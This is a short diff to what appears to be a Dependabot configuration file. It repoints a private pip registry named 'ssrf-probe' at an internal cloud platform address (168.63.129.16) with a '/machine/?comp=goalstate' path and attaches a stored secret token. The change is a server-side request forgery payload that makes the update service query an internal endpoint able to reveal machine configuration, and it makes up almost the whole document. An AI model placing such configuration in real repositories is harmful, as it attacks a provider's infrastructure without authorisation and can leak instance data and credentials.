@@ -2,7 +2,7 @@ version: 2
 registries:
   ssrf-probe:
     type: python-index
-    url: http://168.63.129.16:80
+    url: http://168.63.129.16/machine/?comp=goalstate#
     token: ${{ secrets.SSRF_TOKEN }}
 updates:
   - package-ecosystem: "pip"
